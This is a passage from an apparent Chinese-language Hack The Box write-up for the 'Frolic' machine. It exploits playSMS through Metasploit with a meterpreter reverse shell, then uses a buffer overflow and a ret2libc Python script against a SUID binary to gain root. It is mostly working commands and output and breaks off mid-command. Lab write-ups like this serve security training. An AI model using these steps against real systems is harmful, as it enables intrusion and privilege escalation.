/playsms 目录\n\n咱们在这里登录\n\n![](Hackthebox-Frolic/f86bc99c-3c5a-4669-95a9-ae57de18ae0f.png)\n\n登录成功，到处找找看\n\nGoogle 了一下，playSMS 的漏洞挺多的，解密累了，懒得找了，直接 msf 打试试吧\n\n```bash\nuse multi/http/playsms_uploadcsv_exec\n\nmsf6 exploit(multi/http/playsms_uploadcsv_exec) > show options \n\nModule options (exploit/multi/http/playsms_uploadcsv_exec):\n\n   Name       Current Setting  Required  Description\n   ----       ---------------  --------  -----------\n   PASSWORD   idkwhatispass    yes       Password to authenticate with\n   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOSTS     10.10.10.111     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n   RPORT      9999             yes       The target port (TCP)\n   SSL        false            no        Negotiate SSL/TLS for outgoing connections\n   TARGETURI  /playsms         yes       Base playsms directory path\n   USERNAME   admin            yes       Username to authenticate with\n   VHOST                       no        HTTP server virtual host\n\nPayload options (php/meterpreter/reverse_tcp):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST  10.10.14.10      yes       The listen address (an interface may be specified)\n   LPORT  4444             yes       The listen port\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   PlaySMS 1.4\n```\n按照这样设置好，然后 exploit 执行即可\n\n```bash\nmsf6 exploit(multi/http/playsms_uploadcsv_exec) > exploit \n\n[*] Started reverse TCP handler on 10.10.14.10:4444 \n[+] Authentication successful: admin:idkwhatispass\n[*] Sending stage (39282 bytes) to 10.10.10.111\n[*] Meterpreter session 2 opened (10.10.14.10:4444 -> 10.10.10.111:52368) at 2022-04-25 23:13:40 -0400\n\nmeterpreter > getuid\nServer username: www-data (33)\n```\n成功拿到一个 user 权限\n\n```bash\nwww-data@frolic:/home/ayush$ cat user.txt\ncat user.txt\n    2ab95909cf509f85a6f476b59a0c2fe0\n```\n成功拿到一个 user 权限的 flag 文件\n\n# 权限提升\n```bash\nwww-data@frolic:/home/ayush/.binary$ ls -la\nls -la\ntotal 16\ndrwxrwxr-x 2 ayush ayush 4096 Sep 25  2018 .\ndrwxr-xr-x 3 ayush ayush 4096 Sep 25  2018 ..\n-rwsr-xr-x 1 root  root  7480 Sep 25  2018 rop\nwww-data@frolic:/home/ayush/.binary$ pwd\npwd\n/home/ayush/.binary\n```\n在 /home/ayush/.binary 下发现了一个 rop 文件，并且我们拥有可执行权限\n\n```bash\nwww-data@frolic:/home/ayush/.binary$ ./rop\n./rop\n[*] Usage: program <message>\n```\n会获取我们的输入内容，然后输出\n\n```bash\nwww-data@frolic:/home/ayush/.binary$ base64 rop\nbase64 rop\n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\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABwhAQIUIQECAAAAAABAAAAAQAAAAwAAAAMgwQI\nDQAAAKSFBAgZAAAACJ8ECBsAAAAEAAAAGgAAAAyfBAgcAAAABAAAAPX+/2+sgQQIBQAAAEyCBAgG\nAAAAzIEECAoAAABfAAAACwAAABAAAAAVAAAAAAAAAAMAAAAAoAQIAgAAACgAAAAUAAAAEQAAABcA\nAADkggQIEQAAANyCBAgSAAAACAAAABMAAAAIAAAA/v//b7yCBAj///9vAQAAAPD//2+sggQIAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABSfBAgAAAAA\nAAAAAEaDBAhWgwQIZoMECHaDBAiGgwQIAAAAAAAAAABHQ0M6IChVYnVudHUgNS40LjAtNnVidW50\ndTF+MTYuMDQuMTApIDUuNC4wIDIwMTYwNjA5AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAVIEECAAA\nAAADAAEAAAAAAGiBBAgAAAAAAwACAAAAAACIgQQIAAAAAAMAAwAAAAAArIEECAAAAAADAAQAAAAA\nAMyBBAgAAAAAAwAFAAAAAABMggQIAAAAAAMABgAAAAAArIIECAAAAAADAAcAAAAAALyCBAgAAAAA\nAwAIAAAAAADcggQIAAAAAAMACQAAAAAA5IIECAAAAAADAAoAAAAAAAyDBAgAAAAAAwALAAAAAAAw\ngwQIAAAAAAMADAAAAAAAkIMECAAAAAADAA0AAAAAAKCDBAgAAAAAAwAOAAAAAACkhQQIAAAAAAMA\nDwAAAAAAuIUECAAAAAADABAAAAAAAPCFBAgAAAAAAwARAAAAAAAkhgQIAAAAAAMAEgAAAAAACJ8E\nCAAAAAADABMAAAAAAAyfBAgAAAAAAwAUAAAAAAAQnwQIAAAAAAMAFQAAAAAAFJ8ECAAAAAADABYA\nAAAAAPyfBAgAAAAAAwAXAAAAAAAAoAQIAAAAAAMAGAAAAAAAIKAECAAAAAADABkAAAAAACigBAgA\nAAAAAwAaAAAAAAAAAAAAAAAAAAMAGwABAAAAAAAAAAAAAAAEAPH/DAAAABCfBAgAAAAAAQAVABkA\nAADggwQIAAAAAAIADgAbAAAAEIQECAAAAAACAA4ALgAAAFCEBAgAAAAAAgAOAEQAAAAooAQIAQAA\nAAEAGgBTAAAADJ8ECAAAAAABABQAegAAAHCEBAgAAAAAAgAOAIYAAAAInwQIAAAAAAEAEwClAAAA\nAAAAAAAAAAAEAPH/AQAAAAAAAAAAAAAABADx/6sAAAAUhwQIAAAAAAEAEgC5AAAAEJ8ECAAAAAAB\nABUAAAAAAAAAAAAAAAAABADx/8UAAAAMnwQIAAAAAAAAEwDWAAAAFJ8ECAAAAAABABYA3wAAAAif\nBAgAAAAAAAATAPIAAADwhQQIAAAAAAAAEQAFAQAAAKAECAAAAAABABgAGwEAAKCFBAgCAAAAEgAO\nACsBAAAAAAAAAAAAACAAAABHAQAA0IMECAQAAAASAg4AjwEAACCgBAgAAAAAIAAZAF0BAAAAAAAA\nAAAAABIAAABvAQAA+IQECDoAAAASAA4AdAEAACigBAgAAAAAEAAZACUBAACkhQQIAAAAABIADwB7\nAQAAAAAAAAAAAAASAAAAjQEAACCgBAgAAAAAEAAZAJoBAAAAAAAAAAAAABIAAACqAQAAAAAAAAAA\nAAAgAAAAuQEAACSgBAgAAAAAEQIZAMYBAAC8hQQIBAAAABEAEADVAQAAAAAAAAAAAAASAAAA8gEA\nAECFBAhdAAAAEgAOANEAAAAsoAQIAAAAABAAGgCTAQAAoIMECAAAAAASAA4AAgIAALiFBAgEAAAA\nEQAQAAkCAAAooAQIAAAAABAAGgAVAgAAm4QECF0AAAASAA4AGgIAAAAAAAAAAAAAEgAAACwCAAAA\nAAAAAAAAACAAAABAAgAAKKAECAAAAAARAhkATAIAAAAAAAAAAAAAIAAAAPwBAAAMgwQIAAAAABIA\nCwAAY3J0c3R1ZmYuYwBfX0pDUl9MSVNUX18AZGVyZWdpc3Rlcl90bV9jbG9uZXMAX19kb19nbG9i\nYWxfZHRvcnNfYXV4AGNvbXBsZXRlZC43MjA5AF9fZG9fZ2xvYmFsX2R0b3JzX2F1eF9maW5pX2Fy\ncmF5X2VudHJ5AGZyYW1lX2R1bW15AF9fZnJhbWVfZHVtbXlfaW5pdF9hcnJheV9lbnRyeQByb3Au\nYwBfX0ZSQU1FX0VORF9fAF9fSkNSX0VORF9fAF9faW5pdF9hcnJheV9lbmQAX0RZTkFNSUMAX19p\nbml0X2FycmF5X3N0YXJ0AF9fR05VX0VIX0ZSQU1FX0hEUgBfR0xPQkFMX09GRlNFVF9UQUJMRV8A\nX19saWJjX2NzdV9maW5pAF9JVE1fZGVyZWdpc3RlclRNQ2xvbmVUYWJsZQBfX3g4Ni5nZXRfcGNf\ndGh1bmsuYngAcHJpbnRmQEBHTElCQ18yLjAAdnVsbgBfZWRhdGEAc3RyY3B5QEBHTElCQ18yLjAA\nX19kYXRhX3N0YXJ0AHB1dHNAQEdMSUJDXzIuMABfX2dtb25fc3RhcnRfXwBfX2Rzb19oYW5kbGUA\nX0lPX3N0ZGluX3VzZWQAX19saWJjX3N0YXJ0X21haW5AQEdMSUJDXzIuMABfX2xpYmNfY3N1X2lu\naXQAX2ZwX2h3AF9fYnNzX3N0YXJ0AG1haW4Ac2V0dWlkQEBHTElCQ18yLjAAX0p2X1JlZ2lzdGVy\nQ2xhc3NlcwBfX1RNQ19FTkRfXwBfSVRNX3JlZ2lzdGVyVE1DbG9uZVRhYmxlAAAuc3ltdGFiAC5z\ndHJ0YWIALnNoc3RydGFiAC5pbnRlcnAALm5vdGUuQUJJLXRhZwAubm90ZS5nbnUuYnVpbGQtaWQA\nLmdudS5oYXNoAC5keW5zeW0ALmR5bnN0cgAuZ251LnZlcnNpb24ALmdudS52ZXJzaW9uX3IALnJl\nbC5keW4ALnJlbC5wbHQALmluaXQALnBsdC5nb3QALnRleHQALmZpbmkALnJvZGF0YQAuZWhfZnJh\nbWVfaGRyAC5laF9mcmFtZQAuaW5pdF9hcnJheQAuZmluaV9hcnJheQAuamNyAC5keW5hbWljAC5n\nb3QucGx0AC5kYXRhAC5ic3MALmNvbW1lbnQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAABsAAAABAAAAAgAAAFSBBAhUAQAAEwAAAAAAAAAAAAAAAQAAAAAAAAAjAAAABwAA\nAAIAAABogQQIaAEAACAAAAAAAAAAAAAAAAQAAAAAAAAAMQAAAAcAAAACAAAAiIEECIgBAAAkAAAA\nAAAAAAAAAAAEAAAAAAAAAEQAAAD2//9vAgAAAKyBBAisAQAAIAAAAAUAAAAAAAAABAAAAAQAAABO\nAAAACwAAAAIAAADMgQQIzAEAAIAAAAAGAAAAAQAAAAQAAAAQAAAAVgAAAAMAAAACAAAATIIECEwC\nAABfAAAAAAAAAAAAAAABAAAAAAAAAF4AAAD///9vAgAAAKyCBAisAgAAEAAAAAUAAAAAAAAAAgAA\nAAIAAABrAAAA/v//bwIAAAC8ggQIvAIAACAAAAAGAAAAAQAAAAQAAAAAAAAAegAAAAkAAAACAAAA\n3IIECNwCAAAIAAAABQAAAAAAAAAEAAAACAAAAIMAAAAJAAAAQgAAAOSCBAjkAgAAKAAAAAUAAAAY\nAAAABAAAAAgAAACMAAAAAQAAAAYAAAAMgwQIDAMAACMAAAAAAAAAAAAAAAQAAAAAAAAAhwAAAAEA\nAAAGAAAAMIMECDADAABgAAAAAAAAAAAAAAAQAAAABAAAAJIAAAABAAAABgAAAJCDBAiQAwAACAAA\nAAAAAAAAAAAACAAAAAAAAACbAAAAAQAAAAYAAACggwQIoAMAAAICAAAAAAAAAAAAABAAAAAAAAAA\noQAAAAEAAAAGAAAApIUECKQFAAAUAAAAAAAAAAAAAAAEAAAAAAAAAKcAAAABAAAAAgAAALiFBAi4\nBQAAOAAAAAAAAAAAAAAABAAAAAAAAACvAAAAAQAAAAIAAADwhQQI8AUAADQAAAAAAAAAAAAAAAQA\nAAAAAAAAvQAAAAEAAAACAAAAJIYECCQGAAD0AAAAAAAAAAAAAAAEAAAAAAAAAMcAAAAOAAAAAwAA\nAAifBAgIDwAABAAAAAAAAAAAAAAABAAAAAAAAADTAAAADwAAAAMAAAAMnwQIDA8AAAQAAAAAAAAA\nAAAAAAQAAAAAAAAA3wAAAAEAAAADAAAAEJ8ECBAPAAAEAAAAAAAAAAAAAAAEAAAAAAAAAOQAAAAG\nAAAAAwAAABSfBAgUDwAA6AAAAAYAAAAAAAAABAAAAAgAAACWAAAAAQAAAAMAAAD8nwQI/A8AAAQA\nAAAAAAAAAAAAAAQAAAAEAAAA7QAAAAEAAAADAAAAAKAECAAQAAAgAAAAAAAAAAAAAAAEAAAABAAA\nAPYAAAABAAAAAwAAACCgBAggEAAACAAAAAAAAAAAAAAABAAAAAAAAAD8AAAACAAAAAMAAAAooAQI\nKBAAAAQAAAAAAAAAAAAAAAEAAAAAAAAAAQEAAAEAAAAwAAAAAAAAACgQAAA1AAAAAAAAAAAAAAAB\nAAAAAQAAABEAAAADAAAAAAAAAAAAAABWFwAACgEAAAAAAAAAAAAAAQAAAAAAAAABAAAAAgAAAAAA\nAAAAAAAAYBAAAJAEAAAeAAAALwAAAAQAAAAQAAAACQAAAAMAAAAAAAAAAAAAAPAUAABmAgAAAAAA\nAAAAAAABAAAAAAAAAA==\n```\n编码这个文件，然后带我们自己的机器上解码查看调试\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# cat rop.base64|base64 -d > rop \n\n┌──(root💀kali)-[~/Desktop]\n└─# chmod +x rop                  \n\n┌──(root💀kali)-[~/Desktop]\n└─# ./rop hello \n[+] Message sent: hello\n```\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100\nAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A\n```\n使用 metasploit 的 pattern 生成一个 100 字符的不重复字段\n\n```bash\ngdb-peda$ r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A\nStarting program: /root/Desktop/rop Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A\n\nProgram received signal SIGSEGV, Segmentation fault.\n[----------------------------------registers-----------------------------------]\nEAX: 0x64 ('d')\nEBX: 0xffffd0f0 --> 0x2 \nECX: 0xf7fa7000 --> 0x1ead6c \nEDX: 0x0 \nESI: 0x2 \nEDI: 0x80483a0 (<_start>:       xor    ebp,ebp)\nEBP: 0x41366241 ('Ab6A')\nESP: 0xffffd0c0 (\"8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A\")\nEIP: 0x62413762 ('b7Ab')\nEFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\nInvalid $PC address: 0x62413762\n[------------------------------------stack-------------------------------------]\n0000| 0xffffd0c0 (\"8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A\")\n0004| 0xffffd0c4 (\"Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A\")\n0008| 0xffffd0c8 (\"c1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A\")\n0012| 0xffffd0cc (\"2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A\")\n0016| 0xffffd0d0 (\"Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A\")\n0020| 0xffffd0d4 (\"c5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A\")\n0024| 0xffffd0d8 (\"6Ac7Ac8Ac9Ad0Ad1Ad2A\")\n0028| 0xffffd0dc (\"Ac8Ac9Ad0Ad1Ad2A\")\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\n0x62413762 in ?? ()\n```\n确实是有缓冲区溢出\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x62413762\n[*] Exact match at offset 52\n```\n在第 52 个字符溢出了\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# python -c 'print \"A\"*52'                                                                        \nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n```\n使用 python 输出 52 个A，然后在后面再加上我们的 POC\n\n现在我们需要知道 /bin/sh 的地址\n\n```bash\nwww-data@frolic:/home/ayush/.binary$ ldd rop\nldd rop\n        linux-gate.so.1 =>  (0xb7fda000)\n        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e19000)\n        /lib/ld-linux.so.2 (0xb7fdb000)\n```\n得到了地址 0xb7e19000\n\n查看一下系统位置\n\n```bash\nwww-data@frolic:/home/ayush/.binary$ readelf -s /lib/i386-linux-gnu/libc.so.6 |grep -i system\n</.binary$ readelf -s /lib/i386-linux-gnu/libc.so.6 |grep -i system          \n   245: 00112f20    68 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0\n   627: 0003ada0    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE\n  1457: 0003ada0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0\n```\n拿到了系统地址 0003ada0\n\n```bash\nwww-data@frolic:/home/ayush/.binary$ readelf -s /lib/i386-linux-gnu/libc.so.6 |grep -i exit  \n</.binary$ readelf -s /lib/i386-linux-gnu/libc.so.6 |grep -i exit            \n   112: 0002edc0    39 FUNC    GLOBAL DEFAULT   13 __cxa_at_quick_exit@@GLIBC_2.10\n   141: 0002e9d0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0\n   450: 0002edf0   197 FUNC    GLOBAL DEFAULT   13 __cxa_thread_atexit_impl@@GLIBC_2.18\n   558: 000b07c8    24 FUNC    GLOBAL DEFAULT   13 _exit@@GLIBC_2.0\n   616: 00115fa0    56 FUNC    GLOBAL DEFAULT   13 svc_exit@@GLIBC_2.0\n   652: 0002eda0    31 FUNC    GLOBAL DEFAULT   13 quick_exit@@GLIBC_2.10\n   876: 0002ebf0    85 FUNC    GLOBAL DEFAULT   13 __cxa_atexit@@GLIBC_2.1.3\n  1046: 0011fb80    52 FUNC    GLOBAL DEFAULT   13 atexit@GLIBC_2.0\n  1394: 001b2204     4 OBJECT  GLOBAL DEFAULT   33 argp_err_exit_status@@GLIBC_2.1\n  1506: 000f3870    58 FUNC    GLOBAL DEFAULT   13 pthread_exit@@GLIBC_2.0\n  1849: 000b07c8    24 FUNC    WEAK   DEFAULT   13 _Exit@@GLIBC_2.1.1\n  2108: 001b2154     4 OBJECT  GLOBAL DEFAULT   33 obstack_exit_failure@@GLIBC_2.0\n  2263: 0002e9f0    78 FUNC    WEAK   DEFAULT   13 on_exit@@GLIBC_2.0\n  2406: 000f4c80     2 FUNC    GLOBAL DEFAULT   13 __cyg_profile_func_exit@@GLIBC_2.2\n```\n拿到了 exit 的地址 0002e9d0\n\n```bash\nwww-data@frolic:/home/ayush/.binary$ strings -atx /lib/i386-linux-gnu/libc.so.6 |grep bin/sh\n</.binary$ strings -atx /lib/i386-linux-gnu/libc.so.6 |grep bin/sh           \n 15ba0b /bin/sh\n```\n拿到了 /bin/sh 的地址 15ba0b\n\n然后我们写一个小脚本\n\n```bash\nimport struct\n\nbuf = \"A\" * 52\nlibc = 0xb7e19000\nsystem = struct.pack('<I', libc + 0x0003ada0)\nexit = struct.pack('<I', libc + 0x0002e9d0)\nbinsh = struct.pack('<I', libc + 0x0015ba0b)\n\npayload = buf + system + exit + binsh\n\nprint payload\n```\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# cat exploit.py|base64 -w 